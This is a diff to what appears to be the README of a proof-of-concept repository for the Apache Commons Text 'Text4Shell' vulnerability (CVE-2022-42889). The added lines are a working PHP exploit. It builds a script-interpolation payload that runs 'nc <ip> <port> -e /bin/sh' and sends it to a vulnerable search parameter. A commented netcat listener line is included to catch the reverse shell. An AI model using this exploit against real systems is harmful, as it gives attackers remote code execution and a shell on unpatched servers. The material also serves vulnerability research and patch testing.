@@ -6,9 +6,38 @@ https://github.com/korteke/CVE-2022-42889-POC
 
 #
 ##
-##
-##
 #
+
+
+  <?php
+
+
+
+  function create_payload($ip, $port, $type){
+	  $cmd = "nc $ip $port -e $type";
+	  $payload = '${script:javascript:java.lang.Runtime.getRuntime().exec(\''.trim($cmd).'\')}';
+	  return urlencode($payload);
+    }
+
+  ## add {{exploit}} string to value in vulnerable parmater
+  $url = "http://localhost/text4shell/attack?search={{exploit}}";
+  $ip = "172.17.0.1";
+  $port = 1337;
+  $type = "/bin/sh";
+
+
+  $payload = create_payload($ip, $port, $type);
+
+  file_get_contents(str_replace("{{exploit}}", $payload, $url));
+
+  //system("nc -nlvp 1337")
+
+  ?>
+
+##
+##
+##
+##
 
 Apache commons text  - CVE-2022-42889 Text4Shell proof of concept exploit.
 ## Details📃
